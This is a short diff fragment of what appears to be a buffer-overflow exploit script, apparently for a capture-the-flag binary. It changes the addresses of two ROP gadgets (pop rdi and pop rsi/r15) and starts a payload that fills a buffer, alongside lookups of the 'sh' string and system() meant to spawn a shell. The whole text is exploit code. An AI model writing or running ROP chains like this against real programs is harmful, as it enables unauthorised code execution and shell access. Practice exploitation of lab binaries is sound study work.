@@ -18,9 +18,9 @@ binsh = next(e.search('sh'))
 system = e.symbols['system']
 
 # `pop rdi; ret` gadget
-pop_rdi_ret = 0x4011fb
+pop_rdi_ret = 0x4012bb
 # `pop rsi; pop r15; ret` gadget
-pop_rsi_pop_r15_ret = 0x4011f9
+pop_rsi_pop_r15_ret = 0x4012b9
 
 # fill up `buf1`
 payload = 'a' * 0x20
